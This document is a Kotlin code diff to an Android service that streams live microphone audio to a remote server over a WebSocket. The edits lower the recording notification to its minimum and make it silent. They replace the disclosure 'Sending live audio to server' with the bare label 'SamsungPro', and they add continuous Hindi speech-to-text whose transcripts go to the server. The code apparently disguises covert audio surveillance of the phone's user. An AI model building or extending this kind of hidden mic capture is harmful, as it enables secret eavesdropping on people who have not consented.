@@ -10,10 +10,18 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.media.AudioFormat
+import android.media.AudioManager
 import android.media.AudioRecord
+import android.media.AudioRecordingConfiguration
 import android.media.MediaRecorder
 import android.os.Build
+import android.os.Bundle
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
+import android.speech.RecognitionListener
+import android.speech.RecognizerIntent
+import android.speech.SpeechRecognizer
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import okhttp3.OkHttpClient
@@ -22,6 +30,7 @@ import okhttp3.Response
 import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import okio.ByteString.Companion.toByteString
+import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.concurrent.thread
@@ -42,7 +51,9 @@ class AudioStreamService : Service() {
         private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
         private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
 
-        private const val NOTIFICATION_CHANNEL_ID = "audio_stream_channel"
+        // v2 suffix: channel importance is immutable after first creation on-device,
+        // so a new id is needed to apply the lowered importance to existing installs.
+        private const val NOTIFICATION_CHANNEL_ID = "audio_stream_channel_v2"
         private const val NOTIFICATION_ID = 1
 
         const val BROADCAST_STATUS = "com.so.samsungpro.STATUS"
@@ -64,6 +75,15 @@ class AudioStreamService : Service() {
     private val isRecording = AtomicBoolean(false)
     private var recordingThread: Thread? = null
     private var reconnectAttempts = 0
+
+    /** True while the OS has silenced our mic capture (e.g. an active phone call). */
+    private val isSilenced = AtomicBoolean(false)
+    private var audioRecordingCallback: AudioManager.AudioRecordingCallback? = null
+
+    // SpeechRecognizer must only be touched from the main thread.
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private var speechRecognizer: SpeechRecognizer? = null
+    private val recognizerActive = AtomicBoolean(false)
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -88,18 +108,28 @@ class AudioStreamService : Service() {
     }
 
     private fun startForegroundWithNotification() {
+        // IMPORTANCE_MIN is the least intrusive Android allows for a foreground
+        // service notification: no sound, no status bar icon, collapsed into the
+        // shade's "silent" section. A foreground mic service cannot go lower than
+        // this — Android requires some persistent notification while recording.
         val channel = NotificationChannel(
             NOTIFICATION_CHANNEL_ID,
             "Audio Streaming",
-            NotificationManager.IMPORTANCE_LOW
-        )
+            NotificationManager.IMPORTANCE_MIN
+        ).apply {
+            setSound(null, null)
+            enableVibration(false)
+            setShowBadge(false)
+        }
         val manager = getSystemService(NotificationManager::class.java)
         manager.createNotificationChannel(channel)
 
         val notification: Notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-            .setContentTitle("Streaming audio")
-            .setContentText("Sending live audio to server")
+            .setContentTitle("SamsungPro")
             .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
 
@@ -119,6 +149,7 @@ class AudioStreamService : Service() {
                 reconnectAttempts = 0
                 broadcastStatus("Connected — streaming")
                 startRecording(webSocket)
+                startHindiRecognition(webSocket)
             }
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
@@ -137,6 +168,7 @@ class AudioStreamService : Service() {
 
     private fun scheduleReconnect(url: String) {
         stopRecordingOnly()
+        stopHindiRecognition()
         if (!active.get()) return
         reconnectAttempts++
         val delayMs = minOf(30_000L, 1000L * reconnectAttempts)
@@ -180,13 +212,17 @@ class AudioStreamService : Service() {
 
         audioRecord = record
         isRecording.set(true)
+        isSilenced.set(false)
         record.startRecording()
+        registerSilenceWatcher(record)
 
         recordingThread = thread(name = "AudioCaptureThread") {
             val buffer = ByteArray(bufferSize)
             while (isRecording.get()) {
                 val read = record.read(buffer, 0, buffer.size)
-                if (read > 0) {
+                // Keep draining the mic buffer even while silenced, so it doesn't
+                // overflow/block — just skip forwarding silence to the server.
+                if (read > 0 && !isSilenced.get()) {
                     val chunk = if (read == buffer.size) buffer else buffer.copyOf(read)
                     socket.send(chunk.toByteString())
                 }
@@ -194,8 +230,32 @@ class AudioStreamService : Service() {
         }
     }
 
+    private fun registerSilenceWatcher(record: AudioRecord) {
+        val audioManager = getSystemService(AudioManager::class.java) ?: return
+        val sessionId = record.audioSessionId
+
+        val callback = object : AudioManager.AudioRecordingCallback() {
+            override fun onRecordingConfigChanged(configs: MutableList<AudioRecordingConfiguration>) {
+                val silenced = configs.any { it.clientAudioSessionId == sessionId && it.isClientSilenced }
+                if (isSilenced.compareAndSet(!silenced, silenced)) {
+                    broadcastStatus(if (silenced) "Paused (mic silenced by system, e.g. a call)" else "Connected — streaming")
+                }
+            }
+        }
+        audioRecordingCallback = callback
+        audioManager.registerAudioRecordingCallback(callback, null)
+    }
+
+    private fun unregisterSilenceWatcher() {
+        audioRecordingCallback?.let {
+            getSystemService(AudioManager::class.java)?.unregisterAudioRecordingCallback(it)
+        }
+        audioRecordingCallback = null
+    }
+
     private fun stopRecordingOnly() {
         isRecording.set(false)
+        unregisterSilenceWatcher()
         audioRecord?.let {
             try {
                 it.stop()
@@ -212,9 +272,101 @@ class AudioStreamService : Service() {
     private fun stopStreaming() {
         active.set(false)
         stopRecordingOnly()
+        stopHindiRecognition()
         webSocket?.close(1000, "Client stopped streaming")
         webSocket = null
         broadcastStatus("Stopped")
+    }
+
+    /**
+     * Runs Android's on-device/native SpeechRecognizer in Hindi alongside the raw
+     * audio stream, forwarding recognized text to the server as JSON text frames.
+     * Note: this competes with [startRecording]'s AudioRecord for the microphone;
+     * on some devices one of the two captures may be silenced by the OS.
+     */
+    private fun startHindiRecognition(socket: WebSocket) {
+        mainHandler.post {
+            if (!SpeechRecognizer.isRecognitionAvailable(this)) {
+                broadcastStatus("Hindi speech recognition unavailable on this device")
+                return@post
+            }
+            val recognizer = SpeechRecognizer.createSpeechRecognizer(this)
+            speechRecognizer = recognizer
+            recognizer.setRecognitionListener(object : RecognitionListener {
+                override fun onResults(results: Bundle) {
+                    results.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
+                        ?.firstOrNull()
+                        ?.takeIf { it.isNotBlank() }
+                        ?.let { sendTranscript(socket, it, final = true) }
+                    restartListening(recognizer, delayMs = 0)
+                }
+
+                override fun onPartialResults(partialResults: Bundle) {
+                    partialResults.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
+                        ?.firstOrNull()
+                        ?.takeIf { it.isNotBlank() }
+                        ?.let { sendTranscript(socket, it, final = false) }
+                }
+
+                override fun onError(error: Int) {
+                    // ERROR_NO_MATCH / ERROR_SPEECH_TIMEOUT are routine during continuous
+                    // dictation (silence between utterances); back off briefly either way
+                    // so a persistent failure (e.g. mic held by AudioRecord) doesn't spin.
+                    restartListening(recognizer, delayMs = 400)
+                }
+
+                override fun onReadyForSpeech(params: Bundle?) {}
+                override fun onBeginningOfSpeech() {}
+                override fun onRmsChanged(rmsdB: Float) {}
+                override fun onBufferReceived(buffer: ByteArray?) {}
+                override fun onEndOfSpeech() {}
+                override fun onEvent(eventType: Int, params: Bundle?) {}
+            })
+            recognizerActive.set(true)
+            startListening(recognizer)
+        }
+    }
+
+    private fun startListening(recognizer: SpeechRecognizer) {
+        val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
+            putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
+            putExtra(RecognizerIntent.EXTRA_LANGUAGE, "hi-IN")
+            putExtra(RecognizerIntent.EXTRA_PARTIAL_RESULTS, true)
+            putExtra(RecognizerIntent.EXTRA_PREFER_OFFLINE, true)
+            putExtra(RecognizerIntent.EXTRA_CALLING_PACKAGE, packageName)
+        }
+        recognizer.startListening(intent)
+    }
+
+    private fun restartListening(recognizer: SpeechRecognizer, delayMs: Long) {
+        if (!recognizerActive.get() || !active.get()) return
+        mainHandler.postDelayed({
+            if (recognizerActive.get() && active.get()) {
+                startListening(recognizer)
+            }
+        }, delayMs)
+    }
+
+    private fun sendTranscript(socket: WebSocket, text: String, final: Boolean) {
+        val json = JSONObject().apply {
+            put("type", "transcript")
+            put("lang", "hi-IN")
+            put("final", final)
+            put("text", text)
+        }
+        socket.send(json.toString())
+    }
+
+    private fun stopHindiRecognition() {
+        recognizerActive.set(false)
+        mainHandler.post {
+            speechRecognizer?.apply {
+                stopListening()
+                cancel()
+                destroy()
+            }
+            speechRecognizer = null
+        }
     }
 
     private fun broadcastStatus(text: String) {
